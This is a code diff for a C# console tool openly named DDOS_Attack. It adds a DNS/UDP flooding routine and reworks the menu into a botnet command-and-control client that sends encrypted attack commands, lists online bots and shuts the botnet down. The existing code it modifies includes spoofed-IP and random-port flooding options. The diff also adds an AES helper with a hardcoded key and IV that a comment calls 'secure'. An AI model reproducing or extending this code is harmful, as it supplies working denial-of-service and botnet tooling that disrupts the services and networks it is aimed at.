@@ -4,6 +4,8 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+using System.Security.Cryptography;
+using System.IO;
 
 namespace DDOS_Attack
 {
@@ -30,7 +32,6 @@ namespace DDOS_Attack
 
         static void DDOSAttack(string targetIP, int targetPort, int numConnections, bool useSubnet, bool useRandomPort, bool useSpoofedIP, int attackDuration)
         {
-            // Create a ManualResetEvent to signal when the attack duration is over
             ManualResetEvent attackFinished = new ManualResetEvent(false);
 
             List<Thread> threads = new List<Thread>();
@@ -82,7 +83,6 @@ namespace DDOS_Attack
                     }
                     finally
                     {
-                        // Signal that this thread has finished its attack
                         attackFinished.Set();
                     }
                 });
@@ -91,20 +91,49 @@ namespace DDOS_Attack
                 threads.Add(thread);
             }
 
-            // Wait for all threads to signal that their attacks are finished
             foreach (Thread thread in threads)
             {
                 thread.Join();
             }
 
-            // Wait for the specified attack duration before returning
             attackFinished.WaitOne();
+        }
+
+        static void DNS_DDOSAttack(string targetIP, int numRequests, int attackDuration)
+        {
+            try
+            {
+                using (UdpClient udpClient = new UdpClient())
+                {
+                    IPAddress[] addresses = Dns.GetHostAddresses(targetIP);
+                    if (addresses.Length > 0)
+                    {
+                        IPEndPoint dnsEndPoint = new IPEndPoint(addresses[0], 53);
+                        Random rnd = new Random();
+
+                        DateTime endTime = DateTime.Now.AddSeconds(attackDuration);
+
+                        while (DateTime.Now < endTime)
+                        {
+                            for (int i = 0; i < numRequests; i++)
+                            {
+                                byte[] data = GenerateRandomData(BUFFER_SIZE);
+                                udpClient.Send(data, data.Length, dnsEndPoint);
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
         }
 
         static void Main(string[] args)
         {
-            // Set console foreground color
             Console.ForegroundColor = ConsoleColor.Green;
+            Console.Clear(); // Clear screen
 
             // Display ASCII art
             Console.WriteLine(" ___  __    ___  ___  ________      ___    ___ ________  ________  ________     ");
@@ -118,55 +147,84 @@ namespace DDOS_Attack
 
             Console.WriteLine(); // Add a blank line for spacing
 
+            string botnetHost = null;
+            string botnetIP = null;
+            int botnetPort = 0;
+
             while (true)
             {
-                Console.WriteLine("DDOS Attack Menu:");
-                Console.WriteLine("1. Start Attack");
-                Console.WriteLine("2. Connect to Botnet");
-                Console.WriteLine("3. Exit");
-
-                Console.Write("Enter your choice: ");
-                string choice = Console.ReadLine();
-
-                switch (choice)
+                if (botnetHost == null)
                 {
-                    case "1":
-                        StartAttack();
-                        break;
-                    case "2":
-                        ConnectToBotnet();
-                        break;
-                    case "3":
-                        Console.WriteLine("Exiting...");
-                        return;
-                    default:
-                        Console.WriteLine("Invalid choice. Please enter a valid option.");
-                        break;
+                    Console.WriteLine("Botnet Command Menu:");
+                    Console.WriteLine("1. Connect to Botnet");
+                    Console.WriteLine("2. Exit");
+                    Console.Write("Enter your choice: ");
+                    string choice = Console.ReadLine();
+
+                    switch (choice)
+                    {
+                        case "1":
+                            ConnectToBotnet(out botnetHost, out botnetIP, out botnetPort);
+                            break;
+                        case "2":
+                            Console.WriteLine("Exiting...");
+                            return;
+                        default:
+                            Console.WriteLine("Invalid choice. Please enter a valid option.");
+                            break;
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("Botnet Command Menu:");
+                    Console.WriteLine("1. Start UDP DDOS Attack");
+                    Console.WriteLine("2. Start DNS DDOS Attack");
+                    Console.WriteLine("3. Check Online Bots");
+                    Console.WriteLine("4. Shutdown Botnet");
+                    Console.WriteLine("5. Disconnect from Botnet");
+                    Console.WriteLine("6. Exit");
+
+                    Console.Write("Enter your choice: ");
+                    string choice = Console.ReadLine();
+
+                    switch (choice)
+                    {
+                        case "1":
+                            StartDDOSAttackThroughC2(botnetIP, botnetPort);
+                            break;
+                        case "2":
+                            StartDNSDDOSAttack();
+                            break;
+                        case "3":
+                            CheckOnlineBots(botnetIP, botnetPort);
+                            break;
+                        case "4":
+                            Console.WriteLine("Shutting down botnet...");
+                            break;
+                        case "5":
+                            botnetHost = null;
+                            botnetIP = null;
+                            botnetPort = 0;
+                            Console.WriteLine("Disconnected from botnet.");
+                            break;
+                        case "6":
+                            Console.WriteLine("Exiting...");
+                            return;
+                        default:
+                            Console.WriteLine("Invalid choice. Please enter a valid option.");
+                            break;
+                    }
                 }
 
                 Console.WriteLine();
             }
         }
 
-        static void StartAttack()
+        static void ConnectToBotnet(out string botnetHost, out string botnetIP, out int botnetPort)
         {
-            string targetIP = GetValidIPAddress("Enter the target IP address: ");
-            int targetPort = GetValidPort("Enter the target port: ");
-            int numConnections = GetValidNumber("Enter the number of connections: ");
-            bool useSubnet = GetValidBoolean("Use SUBNET option (true/false): ");
-            bool useRandomPort = GetValidBoolean("Use RANDOM PORT option (true/false): ");
-            bool useSpoofedIP = GetValidBoolean("Use SPOOFED IP option (true/false): ");
-            int attackDuration = GetValidNumber("Enter the duration of the attack in seconds: ");
-
-            Console.WriteLine($"Starting DDOS Attack for {attackDuration} seconds...");
-            DDOSAttack(targetIP, targetPort, numConnections, useSubnet, useRandomPort, useSpoofedIP, attackDuration);
-        }
-
-        static void ConnectToBotnet()
-        {
-            string botnetHost = GetValidHostname("Enter the botnet controller host name: ");
-            string botnetIP = ResolveHostnameToIP(botnetHost);
-            int botnetPort = GetValidPort("Enter the botnet controller port: ");
+            botnetHost = GetValidHostname("Enter the botnet controller host name: ");
+            botnetIP = ResolveHostnameToIP(botnetHost);
+            botnetPort = GetValidPort("Enter the botnet controller port: ");
 
             try
             {
@@ -174,40 +232,35 @@ namespace DDOS_Attack
                 using (NetworkStream stream = client.GetStream())
                 {
                     Console.WriteLine("Connected to botnet controller.");
-
-                    while (true)
-                    {
-                        Console.WriteLine("Botnet Command Menu:");
-                        Console.WriteLine("1. Initiate DDOS Attack");
-                        Console.WriteLine("2. Shutdown Botnet");
-                        Console.WriteLine("3. Exit");
-
-                        Console.Write("Enter your choice: ");
-                        string choice = Console.ReadLine();
-
-                        switch (choice)
-                        {
-                            case "1":
-                                SendDDOSAttackCommand(stream);
-                                break;
-                            case "2":
-                                SendShutdownCommand(stream);
-                                break;
-                            case "3":
-                                Console.WriteLine("Exiting botnet connection...");
-                                return;
-                            default:
-                                Console.WriteLine("Invalid choice. Please enter a valid option.");
-                                break;
-                        }
-
-                        Console.WriteLine();
-                    }
                 }
             }
             catch (Exception ex)
             {
                 Console.WriteLine("Error connecting to botnet: " + ex.Message);
+            }
+        }
+
+        static void CheckOnlineBots(string botnetIP, int botnetPort)
+        {
+            try
+            {
+                using (TcpClient client = new TcpClient(botnetIP, botnetPort))
+                using (NetworkStream stream = client.GetStream())
+                {
+                    byte[] data = Encoding.ASCII.GetBytes("GET ONLINE_BOTS");
+                    stream.Write(data, 0, data.Length);
+
+                    byte[] buffer = new byte[1024];
+                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
+                    string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);
+
+                    Console.WriteLine("Online Bots:");
+                    Console.WriteLine(response);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error checking online bots: " + ex.Message);
             }
         }
 
@@ -221,14 +274,37 @@ namespace DDOS_Attack
             bool useSpoofedIP = GetValidBoolean("Use SPOOFED IP option (true/false): ");
             int attackDuration = GetValidNumber("Enter the duration of the attack in seconds: ");
 
+            // Encrypt the command before sending
             string command = $"DDOS_ATTACK {targetIP} {targetPort} {numConnections} {useSubnet} {useRandomPort} {useSpoofedIP} {attackDuration}";
-            SendCommand(stream, command);
+            byte[] encryptedData = EncryptionHelper.Encrypt(command);
+            stream.Write(encryptedData, 0, encryptedData.Length);
         }
 
-        static void SendShutdownCommand(NetworkStream stream)
+        static void StartDNSDDOSAttack()
         {
-            string command = "SHUTDOWN";
-            SendCommand(stream, command);
+            string targetIP = GetValidIPAddress("Enter the target IP address: ");
+            int numRequests = GetValidNumber("Enter the number of DNS requests to send: ");
+            int attackDuration = GetValidNumber("Enter the duration of the attack in seconds: ");
+
+            DNS_DDOSAttack(targetIP, numRequests, attackDuration);
+        }
+
+        static void StartDDOSAttackThroughC2(string botnetIP, int botnetPort)
+        {
+            try
+            {
+                using (TcpClient client = new TcpClient(botnetIP, botnetPort))
+                using (NetworkStream stream = client.GetStream())
+                {
+                    Console.WriteLine("Connected to botnet controller.");
+
+                    SendDDOSAttackCommand(stream);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error connecting to botnet: " + ex.Message);
+            }
         }
 
         static void SendCommand(NetworkStream stream, string command)
@@ -339,6 +415,36 @@ namespace DDOS_Attack
                 else
                 {
                     Console.WriteLine("Invalid input. Please enter 'true' or 'false'.");
+                }
+            }
+        }
+    }
+
+    static class EncryptionHelper
+    {
+        // Use a secure key and IV
+        private static readonly byte[] Key = new byte[] { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10 };
+        private static readonly byte[] IV = new byte[] { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10 };
+
+        public static byte[] Encrypt(string plainText)
+        {
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = Key;
+                aesAlg.IV = IV;
+
+                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream msEncrypt = new MemoryStream())
+                {
+                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                    {
+                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
+                        {
+                            swEncrypt.Write(plainText);
+                        }
+                        return msEncrypt.ToArray();
+                    }
                 }
             }
         }
